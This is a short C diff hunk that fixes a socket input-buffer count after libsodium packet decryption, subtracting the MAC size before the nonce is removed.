@@ -234,6 +234,9 @@ int laikaS_endInPacket(struct sLaika_socket *sock) {
             LAIKA_ERROR("Failed to decrypt packet!\n")
         }
 
+        /* decrypted message is smaller now */
+        sock->inCount -= crypto_secretbox_MACBYTES;
+
         /* remove nonce */
         laikaM_rmvarray(sock->inBuf, sock->inCount, sock->inStart, crypto_secretbox_NONCEBYTES);
 
